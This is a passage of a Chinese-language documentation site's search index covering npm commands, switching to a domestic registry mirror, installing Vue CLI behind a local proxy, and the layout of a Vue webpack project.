\u6765\u6d4b\u8bd5\u662f\u5426\u6210\u529f\u5b89\u88c5\u3002\u547d\u4ee4\u5982\u4e0b\uff0c\u51fa\u73b0\u7248\u672c\u63d0\u793a\u8868\u793a\u5b89\u88c5\u6210\u529f % npm -v 8.11.0","title":"npm\u7684\u4f7f\u7528"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#npm_1","text":"npm \u5b89\u88c5 Node.js \u6a21\u5757\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a $ npm install <Module Name>","title":"\u4f7f\u7528 npm \u547d\u4ee4\u5b89\u88c5\u6a21\u5757"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_1","text":"npm \u7684\u5305\u5b89\u88c5\u5206\u4e3a\u672c\u5730\u5b89\u88c5\uff08local\uff09\u3001\u5168\u5c40\u5b89\u88c5\uff08global\uff09\u4e24\u79cd\uff0c\u4ece\u6572\u7684\u547d\u4ee4\u884c\u6765\u770b\uff0c\u5dee\u522b\u53ea\u662f\u6709\u6ca1\u6709-g\u800c\u5df2\uff08MAC\u7cfb\u7edf -g\u9700\u8981\u547d\u4ee4\u524dsudo\uff09\uff0c\u6bd4\u5982 npm install express # \u672c\u5730\u5b89\u88c5 sudo npm install express -g # \u5168\u5c40\u5b89\u88c5 \u5982\u679c\u51fa\u73b0\u4ee5\u4e0b\u9519\u8bef\uff1a npm err! Error: connect ECONNREFUSED 127.0.0.1:8087 \u89e3\u51b3\u529e\u6cd5\u4e3a\uff1a $ npm config set proxy null","title":"\u5168\u5c40\u5b89\u88c5\u4e0e\u672c\u5730\u5b89\u88c5"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_2","text":"\u5c06\u5b89\u88c5\u5305\u653e\u5728 ./node_modules \u4e0b\uff08\u8fd0\u884c npm \u547d\u4ee4\u65f6\u6240\u5728\u7684\u76ee\u5f55\uff09\uff0c\u5982\u679c\u6ca1\u6709 node_modules \u76ee\u5f55\uff0c\u4f1a\u5728\u5f53\u524d\u6267\u884c npm \u547d\u4ee4\u7684\u76ee\u5f55\u4e0b\u751f\u6210 node_modules \u76ee\u5f55\u3002 \u53ef\u4ee5\u901a\u8fc7 require() \u6765\u5f15\u5165\u672c\u5730\u5b89\u88c5\u7684\u5305\u3002","title":"\u672c\u5730\u5b89\u88c5"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_3","text":"\u5c06\u5b89\u88c5\u5305\u653e\u5728 /usr/local \u4e0b\u6216\u8005\u4f60 node \u7684\u5b89\u88c5\u76ee\u5f55\u3002 \u53ef\u4ee5\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u91cc\u4f7f\u7528\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u5177\u5907\u4e24\u8005\u529f\u80fd\uff0c\u5219\u9700\u8981\u5728\u4e24\u4e2a\u5730\u65b9\u5b89\u88c5\u5b83\u6216\u4f7f\u7528 npm link \u3002","title":"\u5168\u5c40\u5b89\u88c5"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_4","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u67e5\u770b\u6240\u6709\u5168\u5c40\u5b89\u88c5\u7684\u6a21\u5757\uff1a $ npm list -g \u251c\u2500\u252c cnpm@4.3.2 \u2502 \u251c\u2500\u2500 auto-correct@1.0.0 \u2502 \u251c\u2500\u2500 bagpipe@0.3.5 \u2502 \u251c\u2500\u2500 colors@1.1.2 \u2502 \u251c\u2500\u252c commander@2.9.0 \u2502 \u2502 \u2514\u2500\u2500 graceful-readlink@1.0.1 \u2502 \u251c\u2500\u252c cross-spawn@0.2.9 \u2502 \u2502 \u2514\u2500\u2500 lru-cache@2.7.3 \u2026\u2026 \u5982\u679c\u8981\u67e5\u770b\u67d0\u4e2a\u6a21\u5757\u7684\u7248\u672c\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\uff1a $ npm list grunt projectName@projectVersion /path/to/project/folder \u2514\u2500\u2500 grunt@0.4.1","title":"\u67e5\u770b\u5b89\u88c5\u4fe1\u606f"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_5","text":"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u5378\u8f7d Node.js \u6a21\u5757\u3002 $ npm uninstall express \u5378\u8f7d\u540e\uff0c\u5982\u679c\u5168\u5c40\u5b89\u88c5\u7684\uff0c\u4f60\u53ef\u4ee5\u5230 /node_modules/ \uff08MAC\u5728 /usr/local/lib/node_modules/ \u4e0b\uff09\u76ee\u5f55\u4e0b\u67e5\u770b\u5305\u662f\u5426\u8fd8\u5b58\u5728\uff0c\u6216\u8005\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\uff0c\u5982\u679c\u662f\u672c\u5730\u5b89\u88c5\uff0c\u76f4\u63a5\u5728\u5b89\u88c5\u76ee\u5f55\u8fdb\u884c\u67e5\u770b\uff1a $ npm ls","title":"\u5378\u8f7d\u6a21\u5757"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_6","text":"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u66f4\u65b0\u6a21\u5757\uff1a $ npm update express","title":"\u66f4\u65b0\u6a21\u5757"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#_7","text":"\u4f7f\u7528\u4ee5\u4e0b\u6765\u641c\u7d22\u6a21\u5757\uff1a $ npm search express","title":"\u641c\u7d22\u6a21\u5757"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#npm_2","text":"\u5927\u5bb6\u90fd\u77e5\u9053\u56fd\u5185\u76f4\u63a5\u4f7f\u7528 npm \u7684\u5b98\u65b9\u955c\u50cf\u662f\u975e\u5e38\u6162\u7684\uff0c\u8fd9\u91cc\u63a8\u8350\u4f7f\u7528\u6dd8\u5b9d NPM \u955c\u50cf\u3002 \u6dd8\u5b9d NPM \u955c\u50cf\u662f\u4e00\u4e2a\u5b8c\u6574 npmjs.org \u955c\u50cf\uff0c\u4f60\u53ef\u4ee5\u7528\u6b64\u4ee3\u66ff\u5b98\u65b9\u7248\u672c(\u53ea\u8bfb)\uff0c\u540c\u6b65\u9891\u7387\u76ee\u524d\u4e3a 10\u5206\u949f \u4e00\u6b21\u4ee5\u4fdd\u8bc1\u5c3d\u91cf\u4e0e\u5b98\u65b9\u670d\u52a1\u540c\u6b65\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528\u6dd8\u5b9d\u5b9a\u5236\u7684 cnpm (gzip \u538b\u7f29\u652f\u6301) \u547d\u4ee4\u884c\u5de5\u5177\u4ee3\u66ff\u9ed8\u8ba4\u7684 npm: $ sudo npm install -g cnpm --registry=https://registry.npmmirror.com \u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 cnpm \u547d\u4ee4\u6765\u5b89\u88c5\u6a21\u5757\u4e86\uff1a $ cnpm install [name]","title":"\u4f7f\u7528\u6dd8\u5b9d NPM \u955c\u50cf"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#npm_3","text":"\u67e5\u770b\u539f\u6765\u7684\u6e90 $ npm config get registry https://registry.npmjs.org/ \u66f4\u6362\u56fd\u5185\u7684\u6e90 npm config set registry https://registry.npm.taobao.org \u5b89\u88c5\u4ece\u6307\u5b9a\u7684\u6e90 npm install --registry=https://registry.npm.taobao.org","title":"npm\u66f4\u6362\u955c\u50cf\u6e90"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#npm-installnpm-i","text":"npm i \u5b89\u88c5\u7684\u6a21\u5757\u53ca\u4f9d\u8d56\uff0c\u4f7f\u7528 npm uninstall \u662f\u6ca1\u6709\u529e\u6cd5\u5220\u9664\u7684\uff0c\u5fc5\u987b\u4f7f\u7528 npm uninstall i \u624d\u53ef\u4ee5\u5220\u9664 npm i \u4f1a\u5e2e\u52a9\u68c0\u6d4b\u4e0e\u5f53\u524d node \u6700\u5339\u914d\u7684 npm \u7684\u7248\u672c\u53f7\uff0c\u5e76\u5339\u914d\u51fa\u76f8\u4e92\u4f9d\u8d56\u7684 npm \u5305\u5e94\u8be5\u5347\u7ea7\u7684\u7248\u672c\u53f7 npm i \u5b89\u88c5\u7684\u4e00\u4e9b\u5305\uff0c\u5728\u5f53\u524d\u7684 node \u7248\u672c\u4e0b\u662f\u6ca1\u6709\u529e\u6cd5\u4f7f\u7528\u7684\uff0c\u5fc5\u987b\u4f7f\u7528\u5efa\u8bae\u7248\u672c npm i \u5b89\u88c5\u51fa\u73b0\u95ee\u9898\u662f\u4e0d\u4f1a\u51fa\u73b0 npm-debug.log \u6587\u4ef6\u7684\uff0c\u4f46 npm install \u5b89\u88c5\u51fa\u73b0\u95ee\u9898\u662f\u6709\u8fd9\u4e2a\u6587\u4ef6\u7684 npm i XXX_name -S = > npm install XXX_name --save \u5199\u5165\u5230 dependencies \u5bf9\u8c61 npm i XXX_name -D => npm install XXX_name --save-dev \u5199\u5165\u5230 devDependencies \u5bf9\u8c61 npm i XXX_name -g \u5168\u5c40\u5b89\u88c5 i \u662f install \u7684\u7b80\u5199 -S \u5c31\u662f --save \u7684\u7b80\u5199 -D \u5c31\u662f --save-dev \u8fd9\u6837\u5b89\u88c5\u7684\u5305\u7684\u540d\u79f0\u53ca\u7248\u672c\u53f7\u5c31\u4f1a\u5b58\u5728 package.json \u7684 devDependencies \u8fd9\u4e2a\u91cc\u9762\uff0c\u800c --save \u4f1a\u5c06\u5305\u7684\u540d\u79f0\u53ca\u7248\u672c\u53f7\u653e\u5728dependencies\u91cc\u9762\u3002 \u6211\u4eec\u5728\u4f7f\u7528 npm install \u5b89\u88c5\u6a21\u5757\u6216\u63d2\u4ef6\u7684\u65f6\u5019\uff0c\u6709\u4e24\u79cd\u547d\u4ee4\u628a\u4ed6\u4eec\u5199\u5165\u5230 package.json \u6587\u4ef6\u91cc\u9762\u53bb\uff0c\u6bd4\u5982\uff1a --save --save-dev ** \u5728 package.json \u6587\u4ef6\u91cc\u9762\u63d0\u73b0\u51fa\u6765\u7684\u533a\u522b: --save \u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u88ab\u5199\u5165\u5230 dependencies \u5bf9\u8c61\u91cc\u9762\u53bb\u3002 --save-dev \u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u88ab\u5199\u5165\u5230 devDependencies \u5bf9\u8c61\u91cc\u9762\u53bb\u3002 package.json \u6587\u4ef6\u91cc\u9762\u7684 devDependencies \u548c dependencies \u5bf9\u8c61\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f devDependencies \u91cc\u9762\u7684\u63d2\u4ef6\u53ea\u7528\u4e8e\u5f00\u53d1\u73af\u5883\uff0c\u4e0d\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002 dependencies \u662f\u9700\u8981\u53d1\u5e03\u5230\u751f\u4ea7\u73af\u5883\u7684\u3002","title":"npm install\u4e0enpm i\u533a\u522b\u5982\u4e0b\uff1a"},{"location":"programming_language/vue/vue%E5%AE%89%E8%A3%85/","text":"vue\u5b89\u88c5 mac\u4e0bvue\u5b89\u88c5 \u547d\u4ee4\u884c\u5de5\u5177 Vue.js \u63d0\u4f9b\u4e00\u4e2a\u5b98\u65b9\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u7528\u4e8e\u5feb\u901f\u642d\u5efa\u5927\u578b\u5355\u9875\u5e94\u7528\u3002 % cd /opt/github/vue/ # \u5168\u5c40\u5b89\u88c5 vue-cli $ sudo cnpm install --global vue-cli ... All packages installed (228 packages installed from npm registry, used 3s(network 3s), speed 1.68MB/s, json 217(1014.4KB), tarball 4.63MB, manifests cache hit 0, etag hit 0 / miss 0) [vue-cli@2.9.6] link /usr/local/bin/vue@ -> /usr/local/lib/node_modules/vue-cli/bin/vue [vue-cli@2.9.6] link /usr/local/bin/vue-init@ -> /usr/local/lib/node_modules/vue-cli/bin/vue-init [vue-cli@2.9.6] link /usr/local/bin/vue-list@ -> /usr/local/lib/node_modules/vue-cli/bin/vue-list % npm ls -g /usr/local/lib \u251c\u2500\u2500 cnpm@8.2.0 \u251c\u2500\u2500 corepack@0.10.0 \u251c\u2500\u2500 npm@8.13.2 \u2514\u2500\u2500 vue-cli@2.9.6 $ vue init webpack my-project \u5982\u679c\u4e0d\u5f00\u4ee3\u7406\u8fd9\u91cc\u4f1a\u5361\u4f4f\uff0c\u7136\u540e\u8fc7\u51e0\u5206\u949f\u540e\u5c31\u4f1a\u62a5\u544a vue-cli \u00b7 Failed to download repo vuejs-templates/webpack: connect ECONNREFUSED 127.0.0.1:443 Mac\u53ef\u4ee5\u5b89\u88c5V2rayU\u8fd9\u6b3eAPP\uff0c\u8bbe\u7f6e\u4ee3\u7406\u4e4b\u540e\uff0c\u7136\u540e\u5728APP\u4e2d\u70b9\u51fb \u590d\u5236\u7ec8\u7aef\u4ee3\u7406\u547d\u4ee4 \u7136\u540e\u5728\u7ec8\u7aef\u4e2d\u7c98\u8d34\u4e0a export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 \u7136\u540e\u91cd\u65b0\u8fd0\u884c\u547d\u4ee4\u5373\u53ef $ vue init webpack my-project > my-project@1.0.0 lint > eslint --ext .js,.vue src test/unit test/e2e/specs # Project initialization finished! # ======================== To get started: cd my-project npm run dev Documentation can be found at https://vuejs-templates.github.io/webpack % ls my-project % cd my-project % npm run dev DONE Compiled successfully in 2533ms 21:32:05 I Your application is running here: http://localhost:8080 \u8bbf\u95ee\u9875\u9762\uff1a \u7f16\u8bd1\u6253\u5305 % npm run build ... Build complete. Tip: built files are meant to be served over an HTTP server. Opening index.html over file:// won't work. % ls README.md index.html src build node_modules static config package-lock.json test dist package.json % cd dist % ls index.html static \u5982\u679c\u76f4\u63a5\u53cc\u51fb index.html \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u9875\u9762\u53ef\u80fd\u662f\u7a7a\u767d\u4e86\uff0c\u60f3\u8981\u4fee\u6539\u4e0b index.html \u6587\u4ef6\u4e2d js\u3001css \u8def\u5f84\u5373\u53ef\u3002 \u4f8b\u5982\u6211\u4eec\u6253\u5f00 dist/index.html \u6587\u4ef6\u770b\u5230\u8def\u5f84\u662f\u7edd\u5bf9\u8def\u5f84\uff1a <link href=/static/css/app.33da80d69744798940b135da93bc7b98.css rel=stylesheet> <script type=text/javascript src=/static/js/app.717bb358ddc19e181140.js></script> \u6211\u4eec\u628a js\u3001css \u8def\u5f84\u8def\u5f84\u4fee\u6539\u4e3a\u76f8\u5bf9\u8def\u5f84\uff1a <link href=static/css/app.33da80d69744798940b135da93bc7b98.css rel=stylesheet> <script type=text/javascript src=static/js/app.717bb358ddc19e181140.js></script> \u8fd9\u6837\u76f4\u63a5\u53cc\u51fb dist/index.html \u6587\u4ef6\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u770b\u5230\u6548\u679c\u4e86\u3002","title":"VUE\u5b89\u88c5"},{"location":"programming_language/vue/vue%E5%AE%89%E8%A3%85/#vue","text":"","title":"vue\u5b89\u88c5"},{"location":"programming_language/vue/vue%E5%AE%89%E8%A3%85/#macvue","text":"","title":"mac\u4e0bvue\u5b89\u88c5"},{"location":"programming_language/vue/vue%E5%AE%89%E8%A3%85/#_1","text":"Vue.js \u63d0\u4f9b\u4e00\u4e2a\u5b98\u65b9\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u7528\u4e8e\u5feb\u901f\u642d\u5efa\u5927\u578b\u5355\u9875\u5e94\u7528\u3002 % cd /opt/github/vue/ # \u5168\u5c40\u5b89\u88c5 vue-cli $ sudo cnpm install --global vue-cli ... All packages installed (228 packages installed from npm registry, used 3s(network 3s), speed 1.68MB/s, json 217(1014.4KB), tarball 4.63MB, manifests cache hit 0, etag hit 0 / miss 0) [vue-cli@2.9.6] link /usr/local/bin/vue@ -> /usr/local/lib/node_modules/vue-cli/bin/vue [vue-cli@2.9.6] link /usr/local/bin/vue-init@ -> /usr/local/lib/node_modules/vue-cli/bin/vue-init [vue-cli@2.9.6] link /usr/local/bin/vue-list@ -> /usr/local/lib/node_modules/vue-cli/bin/vue-list % npm ls -g /usr/local/lib \u251c\u2500\u2500 cnpm@8.2.0 \u251c\u2500\u2500 corepack@0.10.0 \u251c\u2500\u2500 npm@8.13.2 \u2514\u2500\u2500 vue-cli@2.9.6 $ vue init webpack my-project \u5982\u679c\u4e0d\u5f00\u4ee3\u7406\u8fd9\u91cc\u4f1a\u5361\u4f4f\uff0c\u7136\u540e\u8fc7\u51e0\u5206\u949f\u540e\u5c31\u4f1a\u62a5\u544a vue-cli \u00b7 Failed to download repo vuejs-templates/webpack: connect ECONNREFUSED 127.0.0.1:443 Mac\u53ef\u4ee5\u5b89\u88c5V2rayU\u8fd9\u6b3eAPP\uff0c\u8bbe\u7f6e\u4ee3\u7406\u4e4b\u540e\uff0c\u7136\u540e\u5728APP\u4e2d\u70b9\u51fb \u590d\u5236\u7ec8\u7aef\u4ee3\u7406\u547d\u4ee4 \u7136\u540e\u5728\u7ec8\u7aef\u4e2d\u7c98\u8d34\u4e0a export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 \u7136\u540e\u91cd\u65b0\u8fd0\u884c\u547d\u4ee4\u5373\u53ef $ vue init webpack my-project > my-project@1.0.0 lint > eslint --ext .js,.vue src test/unit test/e2e/specs # Project initialization finished! # ======================== To get started: cd my-project npm run dev Documentation can be found at https://vuejs-templates.github.io/webpack % ls my-project % cd my-project % npm run dev DONE Compiled successfully in 2533ms 21:32:05 I Your application is running here: http://localhost:8080 \u8bbf\u95ee\u9875\u9762\uff1a \u7f16\u8bd1\u6253\u5305 % npm run build ... Build complete. Tip: built files are meant to be served over an HTTP server. Opening index.html over file:// won't work. % ls README.md index.html src build node_modules static config package-lock.json test dist package.json % cd dist % ls index.html static \u5982\u679c\u76f4\u63a5\u53cc\u51fb index.html \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u9875\u9762\u53ef\u80fd\u662f\u7a7a\u767d\u4e86\uff0c\u60f3\u8981\u4fee\u6539\u4e0b index.html \u6587\u4ef6\u4e2d js\u3001css \u8def\u5f84\u5373\u53ef\u3002 \u4f8b\u5982\u6211\u4eec\u6253\u5f00 dist/index.html \u6587\u4ef6\u770b\u5230\u8def\u5f84\u662f\u7edd\u5bf9\u8def\u5f84\uff1a <link href=/static/css/app.33da80d69744798940b135da93bc7b98.css rel=stylesheet> <script type=text/javascript src=/static/js/app.717bb358ddc19e181140.js></script> \u6211\u4eec\u628a js\u3001css \u8def\u5f84\u8def\u5f84\u4fee\u6539\u4e3a\u76f8\u5bf9\u8def\u5f84\uff1a <link href=static/css/app.33da80d69744798940b135da93bc7b98.css rel=stylesheet> <script type=text/javascript src=static/js/app.717bb358ddc19e181140.js></script> \u8fd9\u6837\u76f4\u63a5\u53cc\u51fb dist/index.html \u6587\u4ef6\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u770b\u5230\u6548\u679c\u4e86\u3002","title":"\u547d\u4ee4\u884c\u5de5\u5177"},{"location":"programming_language/vue/vue%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/","text":"vue\u7684\u76ee\u5f55\u6587\u4ef6 % ls -la total 3000 drwxr-xr-x 20 zhipengyin wheel 640 7 4 22:29 . drwxr-xr-x 4 zhipengyin wheel 128 7 4 22:29 .. -rw-r--r--@ 1 zhipengyin wheel 6148 7 4 22:29 .DS_Store -rw-r--r-- 1 zhipengyin wheel 402 7 4 21:21 .babelrc -rw-r--r-- 1 zhipengyin wheel 147 7 4 21:21 .editorconfig -rw-r--r-- 1 zhipengyin wheel 51 7 4 21:21 .eslintignore -rw-r--r-- 1 zhipengyin wheel 791 7 4 21:21 .eslintrc.js -rw-r--r-- 1 zhipengyin wheel 213 7 4 21:21 .gitignore -rw-r--r-- 1 zhipengyin wheel 246 7 4 21:21 .postcssrc.js -rw-r--r-- 1 zhipengyin wheel 553 7 4 21:21 README.md drwxr-xr-x 10 zhipengyin wheel 320 7 4 21:21 build drwxr-xr-x 6 zhipengyin wheel 192 7 4 21:21 config drwxr-xr-x 5 zhipengyin wheel 160 7 4 22:29 dist -rw-r--r-- 1 zhipengyin wheel 272 7 4 21:21 index.html drwxr-xr-x 1114 zhipengyin wheel 35648 7 4 21:28 node_modules -rw-r--r-- 1 zhipengyin wheel 1489998 7 4 21:28 package-lock.json -rw-r--r-- 1 zhipengyin wheel 2733 7 4 21:21 package.json drwxr-xr-x 7 zhipengyin wheel 224 7 4 21:21 src drwxr-xr-x 3 zhipengyin wheel 96 7 4 21:21 static drwxr-xr-x 4 zhipengyin wheel 128 7 4 21:21 test \u76ee\u5f55\u89e3\u6790 \u76ee\u5f55/\u6587\u4ef6 \u8bf4\u660e build \u9879\u76ee\u6784\u5efa(webpack)\u76f8\u5173\u4ee3\u7801 config \u914d\u7f6e\u76ee\u5f55\uff0c\u5305\u62ec\u7aef\u53e3\u53f7\u7b49\u3002\u6211\u4eec\u521d\u5b66\u53ef\u4ee5\u4f7f\u7528\u9ed8\u8ba4\u7684\u3002 node_modules npm \u52a0\u8f7d\u7684\u9879\u76ee\u4f9d\u8d56\u6a21\u5757 src \u8fd9\u91cc\u662f\u6211\u4eec\u8981\u5f00\u53d1\u7684\u76ee\u5f55\uff0c\u57fa\u672c\u4e0a\u8981\u505a\u7684\u4e8b\u60c5\u90fd\u5728\u8fd9\u4e2a\u76ee\u5f55\u91cc\u3002\u91cc\u9762\u5305\u542b\u4e86\u51e0\u4e2a\u76ee\u5f55\u53ca\u6587\u4ef6\uff1aassets: \u653e\u7f6e\u4e00\u4e9b\u56fe\u7247\uff0c\u5982logo\u7b49\u3002 components: \u76ee\u5f55\u91cc\u9762\u653e\u4e86\u4e00\u4e2a\u7ec4\u4ef6\u6587\u4ef6\uff0c\u53ef\u4ee5\u4e0d\u7528\u3002 App.vue: \u9879\u76ee\u5165\u53e3\u6587\u4ef6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06\u7ec4\u4ef6\u5199\u8fd9\u91cc\uff0c\u800c\u4e0d\u4f7f\u7528 components \u76ee\u5f55\u3002 main.js: \u9879\u76ee\u7684\u6838\u5fc3\u6587\u4ef6\u3002 static \u9759\u6001\u8d44\u6e90\u76ee\u5f55\uff0c\u5982\u56fe\u7247\u3001\u5b57\u4f53\u7b49\u3002 test \u521d\u59cb\u6d4b\u8bd5\u76ee\u5f55\uff0c\u53ef\u5220\u9664 .xxxx\u6587\u4ef6 \u8fd9\u4e9b\u662f\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\uff0c\u5305\u62ec\u8bed\u6cd5\u914d\u7f6e\uff0cgit\u914d\u7f6e\u7b49\u3002 index.html \u9996\u9875\u5165\u53e3\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e9b meta \u4fe1\u606f\u6216\u7edf\u8ba1\u4ee3\u7801\u5565\u7684\u3002 package.json \u9879\u76ee\u914d\u7f6e\u6587\u4ef6\u3002 README.md \u9879\u76ee\u7684\u8bf4\u660e\u6587\u6863\uff0cmarkdown \u683c\u5f0f \u4e0b\u8f7dWebStorm\uff0c\u8ba9WebStorm\u6253\u5f00/opt/github/vue/my-project \u76ee\u5f55\uff0c\u70b9\u51fb\u8fd9\u91cc\uff0c\u53ef\u4ee5\u5728WebStrom\u8fd0\u884c\u7a0b\u5e8f \u4fee\u6539 /opt/github/vue/my-project/src/components/HelloWorld.vue \u6587\u4ef6 \u3002\u3002\u3002\u3002 <script> export default { name: 'HelloWorld', data () { return { msg: '\u6b22\u8fce\u6765\u5230VUE\u6559\u7a0b\uff01' } } } </script> \u8bbf\u95ee\u9875\u9762","title":"VUE\u76ee\u5f55\u6587\u4ef6"},{"location":"programming_language/vue/vue%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/#vue","text":"% ls -la total 3000 drwxr-xr-x 20 zhipengyin wheel 640 7 4 22:29 . drwxr-xr-x 4 zhipengyin wheel 128 7 4 22:29 .. -rw-r--r--@ 1 zhipengyin wheel 6148 7 4 22:29 .DS_Store -rw-r--r-- 1 zhipengyin wheel 402 7 4 21:21 .babelrc -rw-r--r-- 1 zhipengyin wheel 147 7 4 21:21 .editorconfig -rw-r--r-- 1 zhipengyin wheel 51 7 4 21:21 .eslintignore -rw-r--r-- 1 zhipengyin wheel 791 7 4 21:21 .eslintrc.js -rw-r--r-- 1 zhipengyin wheel 213 7 4 21:21 .gitignore -rw-r--r-- 1 zhipengyin wheel 246 7 4 21:21 .postcssrc.js -rw-r--r-- 1 zhipengyin wheel 553 7 4 21:21 README.md drwxr-xr-x 10 zhipengyin wheel 320 7 4 21:21 build drwxr-xr-x 6 zhipengyin wheel 192 7 4 21:21 config drwxr-xr-x 5 zhipengyin wheel 160 7 4 22:29 dist -rw-r--r-- 1 zhipengyin wheel 272 7 4 21:21 index.html drwxr-xr-x 1114 zhipengyin wheel 35648 7 4 21:28 node_modules -rw-r--r-- 1 zhipengyin wheel 1489998 7 4 21:28 package-lock.json -rw-r--r-- 1 zhipengyin wheel 2733 7 4 21:21 package.json drwxr-xr-x 7 zhipengyin wheel 224 7 4 21:21 src drwxr-xr-x 3 zhipengyin wheel 96 7 4 21:21 static drwxr-xr-x 4 zhipengyin wheel 128 7 4 21:21 test","title":"vue\u7684\u76ee\u5f55\u6587\u4ef6"},{"location":"programming_language/vue/vue%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/#_1","text":"\u76ee\u5f55/\u6587\u4ef6 \u8bf4\u660e build \u9879\u76ee\u6784\u5efa(webpack)\u76f8\u5173\u4ee3\u7801 config \u914d\u7f6e\u76ee\u5f55\uff0c\u5305\u62ec\u7aef\u53e3\u53f7\u7b49\u3002\u6211\u4eec\u521d\u5b66\u53ef\u4ee5\u4f7f\u7528\u9ed8\u8ba4\u7684\u3002 node_modules npm \u52a0\u8f7d\u7684\u9879\u76ee\u4f9d\u8d56\u6a21\u5757 src \u8fd9\u91cc\u662f\u6211\u4eec\u8981\u5f00\u53d1\u7684\u76ee\u5f55\uff0c\u57fa\u672c\u4e0a\u8981\u505a\u7684\u4e8b\u60c5\u90fd\u5728\u8fd9\u4e2a\u76ee\u5f55\u91cc\u3002\u91cc\u9762\u5305\u542b\u4e86\u51e0\u4e2a\u76ee\u5f55\u53ca\u6587\u4ef6\uff1aassets: \u653e\u7f6e\u4e00\u4e9b\u56fe\u7247\uff0c\u5982logo\u7b49\u3002 components: \u76ee\u5f55\u91cc\u9762\u653e\u4e86\u4e00\u4e2a\u7ec4\u4ef6\u6587\u4ef6\uff0c\u53ef\u4ee5\u4e0d\u7528\u3002 App.vue: \u9879\u76ee\u5165\u53e3\u6587\u4ef6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06\u7ec4\u4ef6\u5199\u8fd9\u91cc\uff0c\u800c\u4e0d\u4f7f\u7528 components \u76ee\u5f55\u3002 main.js: \u9879\u76ee\u7684\u6838\u5fc3\u6587\u4ef6\u3002 static \u9759\u6001\u8d44\u6e90\u76ee\u5f55\uff0c\u5982\u56fe\u7247\u3001\u5b57\u4f53\u7b49\u3002 test \u521d\u59cb\u6d4b\u8bd5\u76ee\u5f55\uff0c\u53ef\u5220\u9664 .xxxx\u6587\u4ef6 \u8fd9\u4e9b\u662f\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\uff0c\u5305\u62ec\u8bed\u6cd5\u914d\u7f6e\uff0cgit\u914d\u7f6e\u7b49\u3002 index.html \u9996\u9875\u5165\u53e3\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e9b meta \u4fe1\u606f\u6216\u7edf\u8ba1\u4ee3\u7801\u5565\u7684\u3002 package.json \u9879\u76ee\u914d\u7f6e\u6587\u4ef6\u3002 README.md \u9879\u76ee\u7684\u8bf4\u660e\u6587\u6863\uff0cmarkdown \u683c\u5f0f \u4e0b\u8f7dWebStorm\uff0c\u8ba9WebStorm\u6253\u5f00/opt/github/vue/my-project \u76ee\u5f55\uff0c\u70b9\u51fb\u8fd9\u91cc\uff0c\u53ef\u4ee5\u5728WebStrom\u8fd0\u884c\u7a0b\u5e8f \u4fee\u6539 /opt/github/vue/my-project/src/components/HelloWorld.vue \u6587\u4ef6 \u3002\u3002\u3002\u3002 <script> export default { name: 'HelloWorld', data () { return { msg: '\u6b22\u8fce\u6765\u5230VUE\u6559\u7a0b\uff01' } } } </script> \u8bbf\u95ee\u9875\u9762","title":"\u76ee\u5f55\u89e3\u6790"},{"location":"programming_language/vue/%E5%89%8D%E7%AB%AF%E6%97%B6%E4%BB%A3%E7%9A%84%E5%8F%98%E9%9D%A9/","text":"\u524d\u7aef\u5f62\u6210MVC\u65f6\u4ee3\uff0cM\uff08\u6570\u636e\uff09\uff0cV\uff08\u89c6\u56fe\uff09\uff0cC\uff08\u6839\u636e\u6570\u636e\u8fdb\u884c\u63a7\u5236\u8df3\u8f6c\uff09\u00df 